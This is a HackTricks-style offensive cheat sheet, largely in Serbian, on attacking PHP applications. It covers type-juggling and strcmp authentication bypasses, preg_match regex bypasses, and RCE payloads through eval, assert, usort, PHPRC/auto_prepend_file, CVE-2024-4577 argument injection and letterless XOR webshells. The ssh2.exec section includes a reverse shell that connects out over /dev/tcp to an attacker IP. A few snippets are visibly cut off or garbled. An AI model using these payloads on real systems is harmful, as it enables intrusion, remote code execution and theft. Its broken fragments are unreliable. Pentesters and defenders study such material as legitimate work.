# PHP trikovi

{{#include ../../../banners/hacktricks-training.md}}

## Cookies uobičajena lokacija:

Ovo važi i za phpMyAdmin cookies.

Cookies:
```
PHPSESSID
phpMyAdmin
```
Lokacije:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Zaobilaženje PHP poređenja

### Labava poređenja/Type Juggling ( == )

If `==` is used in PHP, then there are unexpected cases where the comparison doesn't behave as expected. This is because "==" only compare values transformed to the same type, if you also want to compare that the type of the compared data is the same you need to use `===`.

PHP comparison tables: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../images/image (567).png>)

{{#file}}
EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf
{{#endfile}}

- `"string" == 0 -> True` String koji ne počinje cifrom je jednak broju
- `"0xAAAA" == "43690" -> True` Stringovi sastavljeni od brojeva u dec ili hex formatu mogu se uporediti sa drugim brojevima/stringovima sa True kao rezultatom ako su brojevi isti (brojevi u stringu se tumače kao brojevi)
- `"0e3264578" == 0 --> True` String koji počinje sa "0e" i prati ga bilo šta biće jednak 0
- `"0X3264578" == 0X --> True` String koji počinje sa "0" i nakon toga ima bilo koje slovo (X može biti bilo koje slovo) i praćen je bilo čim biće jednak 0
- `"0e12334" == "0" --> True` Ovo je vrlo interesantno zato što u nekim slučajevima možete kontrolisati string unos od "0" i neki sadržaj koji se hešira i upoređuje sa njim. Dakle, ako možete da obezbedite vrednost koja će proizvesti heš koji počinje sa "0e" i bez ikakvog slova, možete zaobići poređenje. Možete naći **već heširane stringove** u ovom formatu ovde: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
- `"X" == 0 --> True` Svako slovo u stringu je jednako int 0

More info in [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in_array()**

**Type Juggling** takođe utiče na funkciju `in_array()` po defaultu (morate postaviti treći argument na true da biste napravili strogo poređenje):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Ako se ova funkcija koristi za **bilo koju autentifikacionu proveru** (na primer proveru lozinke) i korisnik kontroliše jednu stranu poređenja, može poslati prazan array umesto stringa kao vrednost lozinke (`https://example.com/login.php/?username=admin&password[]=`) i zaobići ovu proveru:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Ista greška se javlja i sa `strcasecmp()`

### Strogo mešanje tipova

Čak i ako se `===` **koristi**, mogu postojati greške koje čine **poređenje ranjivim** na **mešanje tipova**. Na primer, ako poređenje **pretvara podatke u drugačiji tip objekta pre poređenja**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg_match(/^.*)

**`preg_match()`** može da se koristi za **validaciju unosa korisnika** (on **proverava** da li je neka **word/regex** iz **blacklist** **prisutna** u **unosu korisnika**, i ako nije, kod može nastaviti svoje izvršavanje).

#### New line bypass

Međutim, kada se ograničava početak regexp `preg_match()` **proverava samo prvi red unosa korisnika**, pa ako na neki način možete **poslati** unos u **više redova**, mogli biste uspeti da zaobiđete ovu proveru. Primer:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Da biste zaobišli ovu proveru, možete **poslati vrednost sa novim redovima urlencoded** (`%0A`) ili, ako možete poslati **JSON data**, pošaljite ih u **više linija**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Pronađite primer ovde: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Length error bypass**

(Ovaj bypass je navodno isproban na PHP 5.2.5 i nisam uspeo da ga pokrenem na PHP 7.3.15)\
Ako možete poslati u `preg_match()` validan veoma **veliki input**, on ga **neće moći obraditi** i bićete u mogućnosti da **bypass** proveru. Na primer, ako blacklistuje JSON, možete poslati:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
Izvor: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Trik od: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../images/image (26).png" alt=""><figcaption></figcaption></figure>

Ukratko, problem se javlja zato što `preg_*` funkcije u PHP-u zasnivaju/grade se na [PCRE library](http://www.pcre.org/). U PCRE određene regular expressions se poklapaju korišćenjem mnogo recursive calls, što troši puno stack space. Moguće je postaviti limit na broj dozvoljenih recursija, ali u PHP-u ovaj limit [defaults to 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) koji je veći nego što stane u stack.

[This Stackoverflow thread](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) je takođe bio linkovan u postu gde se ova tema detaljnije razrađuje. Naš zadatak je sada bio jasan:\
**Pošaljite input koji će naterati regex da uradi 100_000+ recursions, uzrokujući SIGSEGV, zbog čega će `preg_match()` vratiti `false`, čime će aplikacija pomisliti da naš input nije malicious, ubacujući na kraju payload-a iznenađenje poput `{system(<verybadcommand>)}` da biste dobili SSTI --> RCE --> flag :)**.

Pa, u terminima regex-a, mi zapravo ne radimo 100k "recursions", već brojimo "backtracking steps", što, kako [PHP documentation](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) navodi, podrazumevano iznosi 1_000_000 (1M) u `pcre.backtrack_limit` varijabli.\
Da bi se to postiglo, `'X'*500_001` će rezultovati sa 1 million backtracking steps (500k forward and 500k backwards):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Type Juggling za PHP obfuscation
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

Ako PHP preusmerava na drugu stranicu, ali nijedna funkcija **`die`** ili **`exit`** nije **pozvana nakon što je zaglavlje `Location` postavljeno**, PHP nastavlja sa izvršavanjem i dodavanjem podataka u telo:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Path Traversal and File Inclusion Exploitation

Proveri:


{{#ref}}
../../../pentesting-web/file-inclusion/
{{#endref}}

## Više trikova

- **register_globals**: U **PHP < 4.1.1.1** ili ako je pogrešno konfigurisan, **register_globals** može biti aktivan (ili se imitira njegovo ponašanje). To znači da u globalnim promenljivama kao što je $\_GET, ako imaju vrednost npr. $\_GET\["param"]="1234", možete joj pristupiti preko **$param**. Dakle, slanjem HTTP parametara možete **prepisati promenljive koje se koriste u kodu**.
- The **PHPSESSION cookies of the same domain are stored in the same place**, zato ako unutar domena **different cookies are used in different paths** možete naterati da jedna putanja **accesses the cookie of the path** postavi vrednost cookie-ja druge putanje. Na ovaj način, ako **both paths access a variable with the same name** možete učiniti da **vrednost te promenljive u path1 važi za path2**. I onda path2 će prihvatiti kao validne promenljive iz path1 (davanjem cookie-ju imena koje odgovara toj promenljivoj u path2).
- Kada imate **usernames** korisnika mašine. Proverite adresu: **/\~\<USERNAME>** da vidite da li su php direktorijumi aktivirani.
- Ako php konfiguracija ima **`register_argc_argv = On`**, onda query parametri razdvojeni razmacima služe za popunjavanje niza argumenata **`array_keys($_SERVER['argv'])`** kao da su **arguments from the CLI**. Ovo je zanimljivo jer ako je ta **setting is off**, vrednost **args array will be `Null`** kada se pozove sa weba jer se args array neće popuniti. Dakle, ako web stranica pokuša da proveri da li se izvršava kao web ili kao CLI alat poređenjem poput `if (empty($_SERVER['argv'])) {`, napadač može poslati **parametre u GET zahtevu kao `?--configPath=/lalala`** i stranica će pomisliti da se izvršava kao CLI i potencijalno parsirati i koristiti te argumente. More info in the [original writeup](https://www.assetnote.io/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms).
- [**LFI and RCE using php wrappers**](../../../pentesting-web/file-inclusion/index.html)

### password_hash/password_verify

Ove funkcije se obično koriste u PHP-u za **generate hashes from passwords** i za **check** da li je lozinka ispravna u poređenju sa hash-om.\
Podržani algoritmi su: `PASSWORD_DEFAULT` i `PASSWORD_BCRYPT` (počinje sa `$2y$`). Imajte na umu da je **PASSWORD_DEFAULT is frequently the same as PASSWORD_BCRYPT.** Takođe, trenutno, **PASSWORD_BCRYPT** ima **size limitation in the input of 72bytes**. Dakle, kada pokušate da heširate nešto veće od 72bytes sa ovim algoritmom samo će prvih 72B biti korišćeno:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP headers bypass zloupotrebom PHP grešaka

#### Izazivanje greške nakon postavljanja headers

From [**this twitter thread**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A&s=19) možete videti da slanjem više od 1000 GET parametara ili 1000 POST parametara ili 20 fajlova, PHOP neće postavljati headers u odgovoru.

Ovo omogućava bypass, na primer CSP headers koji se postavljaju u kodu kao:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### Popunjavanje body-ja pre postavljanja headers

Ako **PHP stranica ispisuje greške i echo-uje nazad unos koji je dao korisnik**, korisnik može naterati PHP server da ispiše **dovoljno dug sadržaj** tako da, kada pokuša da **doda headers** u odgovor, server baci grešku.\
U sledećem scenariju **attacker je naterao server da baci velike greške**, i kao što se vidi na ekranu, kada php pokuša da **izmeniti header informacije, nije mogao** (tako da, na primer, CSP header nije poslat korisniku):

![](<../../../images/image (1085).png>)

## SSRF u PHP funkcijama

Pogledaj stranicu:


{{#ref}}
php-ssrf.md
{{#endref}}

## ssh2.exec stream wrapper RCE
When the `ssh2` extension is installed (`ssh2.so` visible under `/etc/php*/mods-available/`, `php -m`, or even an FTP-accessible `php8.1_conf/` directory), PHP registers `ssh2.*` wrappers that can be abused anywhere user input is concatenated into `fopen()/file_get_contents()` targets. An admin-only download helper such as:
```php
$wrapper = strpos($_GET['format'], '://') !== false ? $_GET['format'] : '';
$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
```
je dovoljno za izvršavanje shell komandi preko localhost SSH:
```http
GET /download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1:22/ping%2010.10.14.6%20-c%201#
```
* Deo kredencijala može ponovo da koristi bilo koji leaked system password (npr. iz cracked bcrypt hashes).
* Završni `#` komentariše server-side sufiks (`files/<id>.zip`), tako da se izvrši samo vaša komanda.
* Blind RCE se potvrđuje praćenjem izlaznog saobraćaja pomoću `tcpdump -ni tun0 icmp` ili serviranjem HTTP canary.

Zameni komandu reverse shell payload-om nakon što je potvrđeno:
```http
format=ssh2.exec://yuri:mustang@127.0.0.1:22/bash%20-c%20'bash%20-i%20>&%20/dev/tcp/10.10.14.6/443%200>&1'#
```
Pošto se sve dešava unutar PHP procesa, TCP konekcija potiče sa ciljanog sistema i nasleđuje privilegije injektovanog naloga (`yuri`, `eric`, itd.).

## Izvršavanje koda

**system("ls");**\
**\`ls\`;**\
**shell_exec("ls");**

[Check this for more useful PHP functions](php-useful-functions-disable_functions-open_basedir-bypass/index.html)

### **RCE preko** **preg_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Da bi se izvršio kod u "replace" argumentu potrebno je najmanje jedno poklapanje.\
Ova opcija funkcije preg_replace je **zastarela od PHP 5.5.0.**

### **RCE via Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE via Assert()**

Ova funkcija unutar php omogućava ti da **izvršiš kod koji je napisan u stringu** kako bi **vratio true ili false** (i u zavisnosti od toga promenio tok izvršavanja). Obično će korisnička promenljiva biti ubačena u sredinu stringa. Na primer:\
`assert("strpos($_GET['page']),'..') === false")` --> U ovom slučaju, da bi dobio **RCE** mogao bi uraditi:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Trebaće vam da **polomite** sintaksu koda, **dodate** svoj **payload**, i onda ga ponovo **ispravite**. Možete koristiti **logičke operacije** kao što su "**and" or "%26%26" or "|"**. Imajte na umu da "or", "||" ne rade zato što, ako je prvi uslov tačan, naš payload se neće izvršiti. Na isti način ";" ne radi jer se naš payload neće izvršiti.

**Other option** je dodati u string izvršenje komande: `'.highlight_file('.passwd').'`

**Other option** (ako imate pristup internom kodu) je promeniti neku promenljivu kako biste izmenili izvršenje: `$file = "hola"`

### **RCE via usort()**

Ova funkcija služi za sortiranje niza elemenata koristeći određenu funkciju.\
Da biste zloupotrebili ovu funkciju:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
You can also use **//** to comment the rest of the code.

To discover the number of parenthesis that you need to close:

- `?order=id;}//`: dobijamo poruku o grešci (`Parse error: syntax error, unexpected ';'`). Verovatno nam nedostaje jedna ili više zagrada.
- `?order=id);}//`: dobijamo **upozorenje**. To deluje odgovarajuće.
- `?order=id));}//`: dobijamo poruku o grešci (`Parse error: syntax error, unexpected ')' i`). Verovatno imamo previše zatvorenih zagrada.

### **RCE preko .httaccess**

Ako možete **upload** **.htaccess**, onda možete **configure** nekoliko stvari i čak izvršavati kod (konfigurišući da fajlovi sa ekstenzijom .htaccess mogu biti **executed**).

Different .htaccess shells can be found [ovde](https://github.com/wireghoul/htshells)

### RCE preko Env Variables

Ako pronađete ranjivost koja vam omogućava da **modify env variables in PHP** (i drugu koja omogućava upload fajlova, mada se to uz dodatno istraživanje može zaobići), možete iskoristiti ovo ponašanje da dobijete **RCE**.

- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/index.html#ld_preload-and-ld_library_path): Ova env promenljiva omogućava učitavanje proizvoljnih biblioteka pri izvršavanju drugih binarnih fajlova (mada u ovom slučaju možda neće raditi).
- **`PHPRC`** : Upućuje PHP gde da pronađe svoj konfiguracioni fajl, obično nazvan `php.ini`. Ako možete upload-ovati sopstveni konfiguracioni fajl, koristite `PHPRC` da ga usmerite na njega. Dodajte stavku **`auto_prepend_file`** koja specificira drugi upload-ovani fajl. Taj drugi fajl sadrži normalan PHP kod, koji zatim bude izvršen od strane PHP runtime-a pre bilo kog drugog koda.
1. Upload PHP fajl koji sadrži naš shellcode
2. Upload-ujte drugi fajl, koji sadrži direktivu **`auto_prepend_file`** koja upućuje PHP preprocesor da izvrši fajl koji smo upload-ovali u koraku 1
3. Podesite `PHPRC` promenljivu na fajl koji smo upload-ovali u koraku 2.
- Više informacija o tome kako izvesti ovaj lanac potražite [**iz originalnog izveštaja**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
- **PHPRC** - druga opcija
- Ako ne možete **upload files**, možete u FreeBSD koristiti "file" `/dev/fd/0` koji sadrži **`stdin`**, tj. **body** zahteva poslatog na `stdin`:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
- Ili da biste dobili RCE, omogućite **`allow_url_include`** i prepend-ujte fajl sa **base64 PHP code**:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
- Tehnika [**iz ovog izveštaja**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

Webserver parsira HTTP zahteve i prosleđuje ih PHP skripti, izvršavajući zahtev kao [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar&ref=labs.watchtowr.com) kao `php.exe cgi.php foo=bar`, što omogućava injekciju parametra. Ovo bi dozvolilo ubacivanje sledećih parametara kako bi se učitao PHP kod iz body-ja:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
Štaviše, moguće je inject the "-" param koristeći karakter 0xAD zbog naknadne normalizacije u PHP-u. Pogledajte exploit example iz [**this post**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/):
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Sanitization bypass & Brain Fuck

[**In this post**](https://blog.redteam-pentesting.de/2024/moodle-rce/) moguće je pronaći sjajne ideje za generisanje brain fuck PHP koda kada je dozvoljen veoma mali broj karaktera.\
Pored toga, predložen je i zanimljiv način za izvršavanje funkcija koji im je omogućio da zaobiđu nekoliko provera:
```php
(1)->{system($_GET[chr(97)])}
```
## PHP statička analiza

Proveri da li možeš ubaciti kod u pozive ovih funkcija (iz [here](https://www.youtube.com/watch?v=SyWUsN0yHKI&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Ako debugujete PHP aplikaciju možete globalno omogućiti ispis grešaka u `/etc/php5/apache2/php.ini` dodavanjem `display_errors = On` i restartovati apache : `sudo systemctl restart apache2`

### Deobfuskacija PHP koda

Možete koristiti **web**[ **www.unphp.net**](http://www.unphp.net) **za deobfuskaciju PHP koda.**

## PHP Wrappers & protokoli

PHP Wrappers i protokoli mogu vam omogućiti da **bypass write and read protections** u sistemu i da ga compromise-ujete. Za [**više informacija pogledajte ovu stranicu**](../../../pentesting-web/file-inclusion/index.html#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug unauthenticated RCE

Ako vidite da je **Xdebug** **omogućen** u izlazu `phpconfig()` trebalo bi da pokušate da dobijete RCE preko [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Variable variables
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE iskorišćavanje new $\_GET\["a"]\($\_GET\["b"])

Ako na stranici možete **kreirati novi objekat proizvoljne klase**, možda ćete moći da dobijete RCE — pogledajte sledeću stranicu da biste saznali kako:


{{#ref}}
php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md
{{#endref}}

## Izvršavanje PHP-a bez slova

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Korišćenje oktalnog zapisa
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR easy shell code

Prema [**this writeup** ](https://mgp25.com/ctf/Web-challenge/) moguće je generisati jednostavan shellcode na sledeći način:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Dakle, ako možete **izvršiti proizvoljan PHP bez brojeva i slova**, možete poslati zahtev kao u nastavku, zloupotrebljavajući taj payload da biste izvršili proizvoljan PHP:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Za detaljnije objašnjenje pogledajte [https://ctf-wiki.org/web/php/php/#preg_match](https://ctf-wiki.org/web/php/php/#preg_match)

### XOR Shellcode (unutar eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Slično Perlu
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
## Izvori
- [0xdf – HTB Era: abusing ssh2.exec stream wrappers](https://0xdf.gitlab.io/2025/11/29/htb-era.html)

{{#include ../../../banners/hacktricks-training.md}}
